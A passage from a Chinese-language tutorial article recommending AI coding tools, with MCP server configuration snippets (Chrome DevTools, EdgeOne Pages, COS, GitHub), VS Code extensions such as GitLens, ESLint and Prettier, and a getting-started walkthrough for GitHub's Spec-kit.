cm-property\">\"mcpServers\": {<br /><span>&nbsp; &nbsp;<span class=\"cm-string cm-property\">\"web-to-mcp\": {<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"url\":&nbsp;<span class=\"cm-string\">\"https://web-to-mcp.com/mcp/你的唯一ID\"<br /><span>&nbsp; }<br /><span>}<br /><span>}</span></span></span></span></span></span></span></span></span></span></span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">之后浏览网页时，点击扩展图标，选中你想要的组件，就能直接在 AI 编程工具里引用它，并且快速生成风格一致的代码了。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">Chrome DevTools MCP 浏览器调试</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/ChromeDevTools/chrome-devtools-mcp\" rel=\"noopener nofollow\"><span class=\"md-plain\">Chrome DevTools MCP</span></a><span class=\"md-plain\"> 是 Chrome 官方团队开发的 MCP 服务器，让 AI 能够直接控制 Chrome 浏览器进行操作和调试。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在做前端开发时，我经常需要调试页面、查看网络请求、分析性能问题。以前这些都得手动在浏览器的开发者工具里操作，现在有了这个工具，我可以直接让 AI 帮我做这些事。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">比如我跟 AI 说：“帮我分析当前这个网站加载慢的原因”，它就能打开 Chrome DevTools，分析网络请求、查看资源加载时间，然后告诉我哪里有问题。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">或者我说：“帮我测试一下这个表单提交功能”，它就能自动填写表单、点击提交按钮、查看请求响应。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong>如何使用？</strong></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在 MCP 配置中添加：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>{<br /><span>&nbsp;<span class=\"cm-string cm-property\">\"mcpServers\": {<br /><span>&nbsp; &nbsp;<span class=\"cm-string cm-property\">\"chrome-devtools\": {<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"command\":&nbsp;<span class=\"cm-string\">\"npx\",<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"args\": [<span class=\"cm-string\">\"-y\",&nbsp;<span class=\"cm-string\">\"chrome-devtools-mcp@latest\"]<br /><span>&nbsp; }<br /><span>}<br /><span>}</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">配置好后，AI 就能帮你自动化测试、调试页面了。工具会自动连接到你正在运行的 Chrome 浏览器，无需额外设置。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这个工具还支持元素定位、网络请求监控、性能分析、页面截图等功能，非常适合前端开发和测试。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">EdgeOne Pages MCP 一键部署</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/TencentEdgeOne/edgeone-pages-mcp\" rel=\"noopener nofollow\"><span class=\"md-plain\">EdgeOne Pages MCP</span></a><span class=\"md-plain\"> 是腾讯云团队开发的部署工具，能把你的项目一键部署到腾讯云的加速网络，让别人能访问你的网站，并且给你的网站提速。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">开发完项目后，你一定会想让别人访问你的网站。传统的部署流程很繁琐，需要人工打包代码、上传代码到服务器、配置域名、设置 HTTPS 安全证书，一套流程下来得花不少时间。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">有了 EdgeOne Pages MCP，我直接在 AI 编程工具里跟 AI 说：“帮我部署这个项目”，它就能自动完成打包、上传、部署的全过程，最后给我一个可以直接访问的 URL。而且部署到全球加速网络，各地访问速度都很快。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong>如何使用？</strong></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">首先到 <span class=\"md-meta-i-c  md-link\"><a href=\"https://console.cloud.tencent.com/edgeone/pages\" rel=\"noopener nofollow\"><span class=\"md-plain\">EdgeOne 控制台</span></a><span class=\"md-plain\"> 开通 Pages 服务：</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">然后获取 API Token，作为调用服务的凭证：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在 MCP 配置中添加：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>{<br /><span>&nbsp;<span class=\"cm-string cm-property\">\"mcpServers\": {<br /><span>&nbsp; &nbsp;<span class=\"cm-string cm-property\">\"edgeone-pages-mcp-server\": {<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"command\":&nbsp;<span class=\"cm-string\">\"npx\",<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"args\": [<span class=\"cm-string\">\"edgeone-pages-mcp\"],<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"env\": {<br /><span>&nbsp; &nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"EDGEONE_PAGES_API_TOKEN\":&nbsp;<span class=\"cm-string\">\"你的API Token\"<br /><span>&nbsp; &nbsp; }<br /><span>&nbsp; }<br /><span>}<br /><span>}</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">配置好后，就能让 AI 帮你一键部署项目了。部署是免费的，支持静态网站、全栈项目、自动配置 HTTPS 和 CDN 加速等功能，非常适合个人项目和小型应用。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">COS MCP 对象存储</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/Tencent/cos-mcp\" rel=\"noopener nofollow\"><span class=\"md-plain\">COS MCP</span></a><span class=\"md-plain\"> 能让 AI 直接操作腾讯云对象存储。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">对象存储就是云端的文件存储服务，可以理解为云盘。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在团队协作开发中，我们经常需要让 AI 参考一些项目规范文档、或者引用一些图片。以前的做法是把这些文件放在本地，然后手动上传给 AI，既不方便，也不利于团队维护、修改和共享。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">有了 COS MCP，我可以说一句话把这些需要共享的文件存到云端，然后让 AI 直接去读取。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">比如我跟 AI 说：“按照我们团队 COS 共享的项目规范文档来写这个功能”，它就能自动从 COS 里读取规范文档，然后按照规范来写代码。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong>如何使用？</strong></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">1）首先需要开通腾讯云 COS 对象存储服务。访问 <span class=\"md-meta-i-c  md-link\"><a href=\"https://console.cloud.tencent.com/cos\" rel=\"noopener nofollow\"><span class=\"md-plain\">腾讯云 COS 控制台</span></a><span class=\"md-plain\">，创建一个存储桶（Bucket）：</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">2）然后在 \"访问管理\" &gt; \"API 密钥管理\" 中获取 SecretId 和 SecretKey，注意一定不要泄露这些信息！</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">3）在 MCP 配置中添加：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>{<br /><span>&nbsp;<span class=\"cm-string cm-property\">\"mcpServers\": {<br /><span>&nbsp; &nbsp;<span class=\"cm-string cm-property\">\"cos-mcp\": {<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"command\":&nbsp;<span class=\"cm-string\">\"npx\",<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"args\": [<br /><span>&nbsp; &nbsp; &nbsp; &nbsp;<span class=\"cm-string\">\"cos-mcp\",<br /><span>&nbsp; &nbsp; &nbsp; &nbsp;<span class=\"cm-string\">\"--Region=你的地域\",<br /><span>&nbsp; &nbsp; &nbsp; &nbsp;<span class=\"cm-string\">\"--Bucket=你的存储桶\",<br /><span>&nbsp; &nbsp; &nbsp; &nbsp;<span class=\"cm-string\">\"--SecretId=你的SecretId\",<br /><span>&nbsp; &nbsp; &nbsp; &nbsp;<span class=\"cm-string\">\"--SecretKey=你的SecretKey\"<br /><span>&nbsp; &nbsp; ]<br /><span>&nbsp; }<br /><span>}<br /><span>}</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">配置好后，AI 就能读取和管理你云端的文件了，相当于给了 AI 一个网盘。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">此外，这个工具还支持图片搜索、图片处理、文档转换、视频封面生成等功能。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">GitHub MCP 代码仓库管理</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/github/github-mcp-server\" rel=\"noopener nofollow\"><span class=\"md-plain\">GitHub MCP</span></a><span class=\"md-plain\"> 是 GitHub 官方开发的 MCP 服务器，让 AI 能够直接操作 GitHub 代码仓库。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">程序员朋友们对 GitHub 肯定不陌生，这是全球最大的代码托管平台，可以用它来存储代码、团队协作开发。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在日常开发中，我可能需要搜索 GitHub 代码仓库、创建 Issue 问题反馈、提交 PR 代码合并请求、查看代码变更、分析提交历史等等。以前这些操作都得在 GitHub 网站上手动完成，现在我可以直接让 AI 帮我做。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">比如我跟 AI 说：“我最近在 GitHub 上开源了哪些项目？star 数如何？”</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">它就能快速给我在 GitHub 上的项目生成一份数据报告：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">或者我说：“帮我看看最近一周的代码变更”，它就能分析 Git 提交记录，告诉我都改了什么。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-pair-s \"><strong>如何使用？</strong></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">首先需要在 GitHub 获取到你的 <span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/settings/tokens\" rel=\"noopener nofollow\"><span class=\"md-plain\">Access Token</span></a><span class=\"md-plain\">，作为访问你 GitHub 资源的凭证：</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">然后在 MCP 配置中添加：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>{<br /><span>&nbsp;<span class=\"cm-string cm-property\">\"mcpServers\": {<br /><span>&nbsp; &nbsp;<span class=\"cm-string cm-property\">\"github\": {<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"url\":&nbsp;<span class=\"cm-string\">\"https://api.githubcopilot.com/mcp/\",<br /><span>&nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"headers\": {<br /><span>&nbsp; &nbsp; &nbsp; &nbsp;<span class=\"cm-string cm-property\">\"Authorization\":&nbsp;<span class=\"cm-string\">\"Bearer 你的GitHub凭证\"<br /><span>&nbsp; &nbsp; }<br /><span>&nbsp; }<br /><span>}<br /><span>}</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></pre>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这个工具还支持代码分析、CI/CD 监控、安全扫描等功能，基本上你在 GitHub 中能做的事，AI 都能帮你做。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h2 class=\"md-end-block md-heading md-focus\"><span class=\"md-plain md-expand\">二、IDE 扩展插件类</span></h2>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">MCP 服务器讲完了，接下来聊聊 IDE 扩展插件。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">IDE 就是集成开发环境，简单理解就是写代码的软件，比如 VS Code、JetBrains IDEA 这些，可以通过安装插件来增强编辑器的能力，让你的开发体验更上一层楼。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">值得一提的是，现在很多有图形界面的 AI 编程工具（比如 Cursor）都是基于 VS Code 开发的，自然也支持 VS Code 的插件，所以下面我也主要分享 VS Code 插件，装上就能用。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">Claude Code 官方扩展</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">Claude Code 是 Anthropic 推出的 AI 编程助手，原本是独立的命令行工具。而 <span class=\"md-meta-i-c  md-link\"><a href=\"https://www.anthropic.com/news/enabling-claude-code-to-work-more-autonomously\" rel=\"noopener nofollow\"><span class=\"md-plain\">Claude Code VS Code 扩展</span></a><span class=\"md-plain\"> 能让你在代码编辑器中直接使用 Claude Code，不用额外打开终端。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在 VS Code 或 Cursor 的扩展商店搜索 \"Claude Code\" 即可安装：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这个扩展的优点是提供了图形界面，你可以通过侧边栏面板和 Claude 对话，能够灵活输入文字。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">当 AI 修改代码时，你能在编辑器里实时看到变化，并且自动显示 diff 对比，让你清楚地知道 AI 改了哪些地方。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">我经常用它来重构代码、修复 Bug、添加新功能。它还支持多会话并行，也就是说你可以同时让多个 Claude 代理处理不同的任务，比如一个负责前端，一个负责后端，大大提高开发效率。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">顺带一提，类似的插件还有 Cline、GitHub Copilot 等，功能都差不多，大家可以根据自己的喜好选择。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">GitLens Git 可视化</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://www.gitkraken.com/gitlens\" rel=\"noopener nofollow\"><span class=\"md-plain\">GitLens</span></a><span class=\"md-plain\"> 能让你更直观地查看 Git 代码的修改历史。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">Git 是程序员用来管理代码版本的工具，简单理解就是能记录代码的每一次修改，包括谁改的、什么时候改的、为什么改。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">有了这些记录，出了 Bug 时我就能快速找到 “凶手” 追责。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">但 Git 只是个命令行工具，想查看历史记录还需要手敲命令，看起来也不太舒服。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">当我通过编辑器的扩展商店安装了 GitLens 后，把鼠标放到任意代码行上，GitLens 就会自动显示这行代码的作者、相关的 PR 合并请求等等。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">进入 Git 管理面板，整个项目的提交记录一目了然。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">此外，它还支持 AI 功能，能自动生成提交信息、解释代码变更、生成变更日志、用 AI 解释某次改动的目的。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">⭐️ Office Viewer 文档预览</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c md-link\"><a href=\"https://github.com/cweijan/vscode-office\" rel=\"noopener nofollow\"><span class=\"md-plain\">Office Viewer</span></a><span class=\"md-plain\"> 能帮你在编辑器里直接预览和编辑各种文档。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">我们知道，AI 输出的文档内容以 Markdown 格式为主，默认的编辑器中打开 Markdown 文件只能看到原始的标记语法，不够直观。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">看长文的时候，我还要用 Typora 等专业的 Markdown 编辑器打开文档，比较麻烦。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在扩展商店搜索 \"Office Viewer\" 并安装后，可以直接在编辑器中使用所见即所得的 Markdown 编辑器，看文档、写文档都很方便，不用来回切换窗口。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">此外，这个插件支持 Excel 表格、Word 文档、PDF 文档、SVG、字体文件、压缩包等多种格式，堪称编辑器里的万能文档查看器。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">⭐️ ESLint 代码质量检查</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c md-link\"><a href=\"https://eslint.org/\" rel=\"noopener nofollow\"><span class=\"md-plain\">ESLint</span></a><span class=\"md-plain\"> 是前端 JavaScript / TypeScript 项目必备的代码检查工具。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">虽然编辑器本身也能检查一些基本的语法错误，但对于代码规范、潜在的逻辑漏洞等问题，就需要专业的代码检查工具来把关了。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">现在很多 AI 生成的项目代码都会自带 ESLint 配置文件（比如 <span class=\"md-pair-s\"><code>.eslintrc.js</code><span class=\"md-plain\"> 或者 <span class=\"md-pair-s\"><code>eslint.config.js</code><span class=\"md-plain\">），定义好团队统一的代码检查规则。</span></span></span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在扩展商店搜索 \"ESLint\" 并安装后，插件会自动检测项目中的规则配置文件，然后实时检查代码中的问题，并给出修复建议。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这样一来，AI 写的代码如果有不规范的地方，你立刻就能发现并让 AI 修正，避免埋下隐患。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">⭐️ Prettier 代码格式化</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://prettier.io/\" rel=\"noopener nofollow\"><span class=\"md-plain\">Prettier</span></a><span class=\"md-plain\"> 是一个代码格式化工具，能自动统一代码风格。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">团队协作时，每个人的编码习惯不同，有的代码缩进 4 格、有的缩进 2 格；有的用单引号、有的用双引号。大家的代码风格五花八门，看着就很乱，代码审查时也容易出现 Beef。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">这时就需要统一的格式化规范了。现在很多 AI 生成的项目代码都会自带 Prettier 配置文件（比如 <span class=\"md-pair-s\"><code>.prettierrc</code><span class=\"md-plain\">），定义好统一的格式化规则。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在扩展商店搜索 \"Prettier\" 并安装后，就可以用快捷键一键格式化代码。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">还可以在 VS Code 的设置里搜索 \"Format On Save\" 并开启，这样每次保存代码时就会自动格式化，保证整个项目的代码风格一致。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">Error Lens 错误实时显示</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/usernamehw/vscode-error-lens\" rel=\"noopener nofollow\"><span class=\"md-plain\">Error Lens</span></a><span class=\"md-plain\"> 能让你一眼看到代码中的错误。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">一般情况下，如果代码中有错误，你得把鼠标移到红色波浪线上才能看到错误提示，不够直观。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在扩展商店搜索 \"Error Lens\" 并安装后，错误信息会直接高亮显示在代码行尾，你一眼就能看到哪里有问题。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">Console Ninja 控制台日志显示</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/wallabyjs/console-ninja\" rel=\"noopener nofollow\"><span class=\"md-plain\">Console Ninja</span></a><span class=\"md-plain\"> 能让你在编辑器里直接看到代码的运行结果。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在调试前端代码时，我经常需要看 <span class=\"md-pair-s\"><code>console.log</code><span class=\"md-plain\"> 打印出来的日志输出。要先切换到浏览器，再按 F12 打开开发者工具来查看控制台，比较麻烦。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">在扩展商店搜索 \"Console Ninja\" 并安装后，直接在编辑器里就能看到输出结果，看到每个日志是从哪个文件哪一行输出的，还能显示网络请求和错误堆栈。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">有了它，不用频繁切换窗口了，调试效率大大提升。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h2 class=\"md-end-block md-heading\"><span class=\"md-plain\">三、跨编辑器通用工具</span></h2>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">前面介绍的工具都是对编辑器能力的增强，接下来聊聊跨编辑器通用的工具。这些工具不依赖特定的编辑器，适用于 Cursor、VS Code、Claude Code、GitHub Copilot 等几乎所有主流的 AI 编程工具。</span></p>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<h3 class=\"md-end-block md-heading\"><span class=\"md-plain\">Spec-kit 规范驱动开发</span></h3>\n<p class=\"md-end-block md-p\"><span class=\"md-meta-i-c  md-link\"><a href=\"https://speckit.org/\" rel=\"noopener nofollow\"><span class=\"md-plain\">Spec-kit</span></a><span class=\"md-plain\"> 是 GitHub 推出的规范驱动开发（SDD）框架。</span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">什么是 SDD 呢？</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">传统开发流程是：想到什么写什么，边写边改，最后再补文档。这样容易导致需求不清晰、代码和文档对不上。</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">而规范驱动开发的思路正好相反：先把需求写成规范文档，并且把规范文档当作代码的 <span class=\"md-pair-s \"><strong>唯一真相来源</strong><span class=\"md-plain\">。你可以把规范文档理解为 <span class=\"md-pair-s \"><strong>法律条文</strong><span class=\"md-plain\">，它包含了详细的需求描述、系统设计和接口定义。AI 必须严格遵守这些条文来生成代码，确保产出完全符合预期。</span></span></span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">听起来有些抽象，我们可以跟着 <span class=\"md-meta-i-c  md-link\"><a href=\"https://github.com/github/spec-kit\" rel=\"noopener nofollow\"><span class=\"md-plain\">Spec-kit GitHub 仓库</span></a><span class=\"md-plain\"> 的官方文档来实战一下。</span></span></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">首先打开终端，利用 uvx 命令直接安装运行 Specify 工具，并初始化一个项目：</span></p>\n<pre class=\"md-fences md-end-block ty-contain-cm modeLoaded\"><span>uvx&nbsp;<span class=\"cm-attribute\">--from&nbsp;<span class=\"cm-builtin\">git<span class=\"cm-operator\">+https://github.com/github/spec-kit.git specify init my-project</span></span></span></span></pre>\n<p class=\"md-end-block md-p\">&nbsp;</p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">选择你使用的 AI 编程工具，Spec-kit 支持 Claude Code、GitHub Copilot 等几乎所有主流编程工具。这里我选 Claude Code：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">根据操作系统选择脚本类型，Windows 选下面的，其他选上面的：</span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-image md-img-loaded\"><img class=\"lazyload\" /></span></p>\n<p class=\"md-end-block md-p\"><span class=\"md-plain\">执行完这个命令后，会在当前目录下创建一个 <span class=\"md-pair-s\"><code>my-project</code><span class=\"md-plain\"> 